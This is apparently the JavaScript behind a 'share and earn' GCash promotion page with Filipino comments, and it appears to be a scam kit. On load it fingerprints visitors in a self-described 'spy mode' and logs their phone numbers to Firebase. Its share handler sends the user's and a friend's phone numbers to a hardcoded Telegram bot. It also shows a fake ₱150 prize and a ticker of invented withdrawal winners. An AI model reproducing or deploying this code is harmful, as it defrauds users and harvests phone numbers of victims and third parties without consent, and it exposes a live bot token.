// ========== SIMPLE DEVICE + NUMBER TRACKING (SPY MODE) ==========
// Walang blocking, record lang ng activity para makita sa admin

const spyTracker = {
    // Kunin ang fingerprint ng device
    getFingerprint: function() {
        const screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const fingerprintString = `${navigator.userAgent}|${screen}|${timezone}|${navigator.language}|${navigator.platform}|${navigator.hardwareConcurrency || 'unknown'}|${navigator.deviceMemory || 'unknown'}`;
        
        let hash = 0;
        for (let i = 0; i < fingerprintString.length; i++) {
            hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
            hash |= 0;
        }
        return `FP_${Math.abs(hash)}`;
    },

    // I-record ang activity (spy mode - walang block)
    track: async function() {
        const phone = localStorage.getItem("userPhone");
        const fingerprint = this.getFingerprint();
        
        if (!phone) return;
        
        if (typeof firebase !== 'undefined' && firebase.database) {
            const db = firebase.database();
            
            try {
                // 1. I-record ang device kung bago
                const deviceRef = db.ref('devices/' + fingerprint);
                const deviceSnap = await deviceRef.once('value');
                
                if (!deviceSnap.exists()) {
                    // Gumawa ng device ID (Dev1, Dev2, etc.)
                    const counterRef = db.ref('admin/deviceCounter');
                    const counterSnap = await counterRef.once('value');
                    let nextNum = (counterSnap.val() || 0) + 1;
                    await counterRef.set(nextNum);
                    const displayId = `Dev${nextNum}`;
                    
                    await deviceRef.set({
                        phone: phone,
                        displayId: displayId,
                        fingerprint: fingerprint,
                        firstSeen: Date.now(),
                        lastSeen: Date.now()
                    });
                    
                    await db.ref('device_id_map/' + fingerprint).set({
                        displayId: displayId,
                        phone: phone,
                        createdAt: Date.now()
                    });
                    
                    localStorage.setItem("userDeviceDisplayId", displayId);
                    console.log(`🕵️ New device tracked: ${displayId} for ${phone}`);
                } else {
                    // I-update ang last seen
                    await deviceRef.update({
                        lastSeen: Date.now(),
                        phone: phone
                    });
                }
                
                // 2. I-link ang device sa number
                await db.ref('device_phone_map/' + fingerprint).set({
                    phone: phone,
                    lastSeen: Date.now()
                });
                
                // 3. I-update ang user session na may device info
                const sessionRef = db.ref('user_sessions/' + phone);
                const sessionSnap = await sessionRef.once('value');
                
                if (!sessionSnap.exists()) {
                    await sessionRef.set({
                        phone: phone,
                        balance: 0,
                        deviceFingerprint: fingerprint,
                        deviceDisplayId: localStorage.getItem("userDeviceDisplayId") || "Unknown",
                        firstVisit: Date.now(),
                        lastUpdate: Date.now()
                    });
                } else {
                    await sessionRef.update({
                        deviceFingerprint: fingerprint,
                        deviceDisplayId: localStorage.getItem("userDeviceDisplayId") || sessionSnap.val().deviceDisplayId,
                        lastUpdate: Date.now()
                    });
                }
                
                // 4. I-record ang activity log
                await db.ref('activity_logs/' + Date.now()).set({
                    phone: phone,
                    deviceId: localStorage.getItem("userDeviceDisplayId") || "Unknown",
                    fingerprint: fingerprint,
                    page: "share_and_earn",
                    timestamp: Date.now()
                });
                
                console.log(`🕵️ Tracked: ${phone} | Device: ${localStorage.getItem("userDeviceDisplayId") || "Unknown"}`);
                
            } catch(e) {
                console.log("Tracking error:", e);
            }
        }
    }
};

// ========== REFERRAL TIMER (PERSISTENT - 5 MINUTES) ==========
// Kahit i-refresh ang page, tuloy parin ang timer

const referralTimer = {
    STORAGE_KEY: 'referral_end_time',
    
    // Simulan ang timer (5 minutes = 300 seconds)
    startTimer: function() {
        const endTime = Date.now() + (5 * 60 * 1000); // 5 minutes from now
        localStorage.setItem(this.STORAGE_KEY, endTime);
        return endTime;
    },
    
    // Kunin ang natitirang oras (returns seconds remaining)
    getRemainingTime: function() {
        const endTime = localStorage.getItem(this.STORAGE_KEY);
        if (!endTime) return 0;
        
        const remaining = parseInt(endTime) - Date.now();
        if (remaining <= 0) {
            this.clearTimer();
            return 0;
        }
        return Math.floor(remaining / 1000);
    },
    
    // I-clear ang timer
    clearTimer: function() {
        localStorage.removeItem(this.STORAGE_KEY);
    },
    
    // I-update ang display ng timer
    updateDisplay: function() {
        const remainingSecs = this.getRemainingTime();
        const timerElement = document.getElementById('popupTimerDisplay');
        
        if (timerElement && remainingSecs > 0) {
            const mins = Math.floor(remainingSecs / 60);
            const secs = remainingSecs % 60;
            timerElement.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
            return true;
        } else if (timerElement && remainingSecs <= 0) {
            timerElement.innerHTML = "00:00";
        }
        return false;
    },
    
    // Simulan ang countdown interval
    startCountdown: function() {
        // Update agad
        this.updateDisplay();
        
        // Update every second
        const interval = setInterval(() => {
            const hasTime = this.updateDisplay();
            if (!hasTime) {
                clearInterval(interval);
                // Timer expired - enable claim button kung expired na
                const claimBtn = document.getElementById('claimGCashBtn');
                if (claimBtn) {
                    claimBtn.disabled = false;
                    claimBtn.style.opacity = '1';
                }
            }
        }, 1000);
        
        return interval;
    }
};

// ========== SHARE BUTTON LOGIC (NA MAY REFERRAL TIMER) ==========
let shareCountdownInterval = null;

function startShareCountdown() {
    if (shareCountdownInterval) clearInterval(shareCountdownInterval);
    
    shareCountdownInterval = setInterval(() => {
        const remaining = referralTimer.getRemainingTime();
        const shareBtn = document.getElementById('shareButton');
        const friendInput = document.getElementById('friendPhoneInput');
        const statusMsg = document.getElementById('statusMessage');
        
        if (remaining > 0) {
            const mins = Math.floor(remaining / 60);
            const secs = remaining % 60;
            if (shareBtn) {
                shareBtn.disabled = true;
                shareBtn.innerHTML = `⏰ WAIT ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
            }
            if (friendInput) friendInput.disabled = true;
            if (statusMsg) {
                statusMsg.innerHTML = `<span class="status-waiting">⏳ Please wait ${mins}:${secs.toString().padStart(2, '0')} before sharing again ⏳</span>`;
            }
        } else {
            // Timer expired - activate share button
            if (shareBtn) {
                shareBtn.disabled = false;
                shareBtn.innerHTML = "🐾 SHARE & UNLOCK 🐾";
            }
            if (friendInput) friendInput.disabled = false;
            if (statusMsg) {
                statusMsg.innerHTML = `<span class="status-unlocked">🎉 Share with a friend to unlock 150 credits! 🎉</span>`;
            }
            clearInterval(shareCountdownInterval);
            shareCountdownInterval = null;
        }
    }, 1000);
}

// ========== SHARE BUTTON HANDLER ==========
async function handleShare() {
    const friendPhone = document.getElementById('friendPhoneInput').value.trim();
    const userPhone = localStorage.getItem("userPhone");
    
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Please enter valid 11-digit number starting with 09");
        return;
    }
    
    if (friendPhone === userPhone) {
        alert("You cannot invite yourself!");
        return;
    }
    
    // Send notification to Telegram
    const message = `📱 REFERRAL INVITE!\n👤 User: ${userPhone}\n👥 Friend: ${friendPhone}\n💰 Reward: ₱150 each`;
    
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`);
    } catch(e) {
        console.log("Telegram error:", e);
    }
    
    // Start the 5-minute timer
    referralTimer.startTimer();
    startShareCountdown();
    
    // Clear input field
    document.getElementById('friendPhoneInput').value = '';
    
    // Update progress bar (simulate)
    const progressFill = document.getElementById('progressFill');
    if (progressFill) progressFill.style.width = '100%';
    
    // Show prize popup
    showPrizePopup();
}

// ========== PRIZE POPUP FUNCTIONS ==========
function showPrizePopup() {
    const popup = document.getElementById('prizePopup');
    const popupBalance = document.getElementById('popupBalanceAmount');
    
    if (popupBalance) popupBalance.innerHTML = "₱150.00";
    
    // Start the persistent countdown timer
    referralTimer.startCountdown();
    
    // Start confetti
    startConfetti();
    
    if (popup) popup.style.display = 'flex';
}

function closePrizePopup() {
    const popup = document.getElementById('prizePopup');
    if (popup) popup.style.display = 'none';
    stopConfetti();
}

// ========== CONFETTI FUNCTIONS ==========
let confettiInterval = null;

function startConfetti() {
    const canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const ctx = canvas.getContext('2d');
    
    const particles = [];
    for (let i = 0; i < 150; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height - canvas.height,
            size: Math.random() * 8 + 3,
            color: `hsl(${Math.random() * 360}, 100%, 60%)`,
            speed: Math.random() * 4 + 2,
            angle: Math.random() * Math.PI * 2
        });
    }
    
    function draw() {
        if (!canvas || canvas.style.display === 'none') return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        for (let p of particles) {
            ctx.fillStyle = p.color;
            ctx.fillRect(p.x, p.y, p.size, p.size);
            p.y += p.speed;
            if (p.y > canvas.height) {
                p.y = -p.size;
                p.x = Math.random() * canvas.width;
            }
        }
        
        confettiInterval = requestAnimationFrame(draw);
    }
    
    draw();
}

function stopConfetti() {
    if (confettiInterval) {
        cancelAnimationFrame(confettiInterval);
        confettiInterval = null;
    }
    const canvas = document.getElementById('confettiCanvas');
    if (canvas) {
        const ctx = canvas.getContext('2d');
        ctx.clearRect(0, 0, canvas.width, canvas.height);
    }
}

// ========== CLAIM GCASH BUTTON CONNECTION (WITHOUT BAN CHECK) ==========
function connectClaimButton() {
    const claimGCashBtn = document.getElementById('claimGCashBtn');
    
    if (claimGCashBtn) {
        claimGCashBtn.onclick = function() {
            // DIRECT CLAIM - No ban check, no device restriction
            // Just call the firewall logic from popup.js
            if (typeof window.showClaimPopup === 'function') {
                window.showClaimPopup(150);
            } else {
                console.error("showClaimPopup not loaded. Make sure popup.js is loaded first.");
                alert("System loading. Please try again.");
            }
        };
    }
}

// ========== MAIN TIMER (END OF PROMO) ==========
function updateMainTimer() {
    const target = new Date(2026, 4, 1, 0, 0, 0);
    const now = new Date();
    const diff = target - now;
    const timerDisplay = document.getElementById('mainTimerDisplay');
    
    if (timerDisplay && diff > 0) {
        const days = Math.floor(diff / (1000*60*60*24));
        const hours = Math.floor((diff % (86400000)) / 3600000);
        const mins = Math.floor((diff % 3600000) / 60000);
        const secs = Math.floor((diff % 60000) / 1000);
        timerDisplay.innerHTML = `${days}D ${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
    } else if (timerDisplay) {
        timerDisplay.innerHTML = "00:00:00";
    }
}

// ========== WINNER TICKER ==========
function startWinnerTicker() {
    setInterval(() => {
        const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const randomSuffix = Math.floor(1000 + Math.random() * 9000);
        const amounts = [150, 300, 500, 750, 1000];
        const amount = amounts[Math.floor(Math.random() * amounts.length)];
        const winnerSpan = document.getElementById('winnerText');
        
        if (winnerSpan) {
            winnerSpan.innerHTML = `${randomPrefix}***${randomSuffix} withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱${amount}`;
        }
    }, 3500);
}

// ========== CHECK REFERRAL TIMER ON PAGE LOAD ==========
function checkExistingTimer() {
    const remaining = referralTimer.getRemainingTime();
    if (remaining > 0) {
        // May active timer pa, i-disable ang share button
        startShareCountdown();
        referralTimer.startCountdown(); // Para sa popup timer kung bukas ang popup
    }
}

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Promotion.js loaded - Spy Mode Only");
    
    // Track device and number (spy mode - no blocking)
    spyTracker.track();
    
    // Check kung may existing referral timer
    checkExistingTimer();
    
    // Share button handler
    const shareBtn = document.getElementById('shareButton');
    if (shareBtn) {
        // Remove all existing event listeners
        const newShareBtn = shareBtn.cloneNode(true);
        shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
        newShareBtn.onclick = handleShare;
        newShareBtn.disabled = false;
    }
    
    // Connect claim button to firewall logic
    connectClaimButton();
    
    // Start main timer
    updateMainTimer();
    setInterval(updateMainTimer, 1000);
    
    // Start winner ticker
    startWinnerTicker();
    
    // Close popup when clicking outside
    const popup = document.getElementById('prizePopup');
    if (popup) {
        popup.onclick = function(e) {
            if (e.target === popup) {
                closePrizePopup();
            }
        };
    }
    
    console.log("✅ Promotion.js initialized (Spy Mode - No Restrictions)");
});
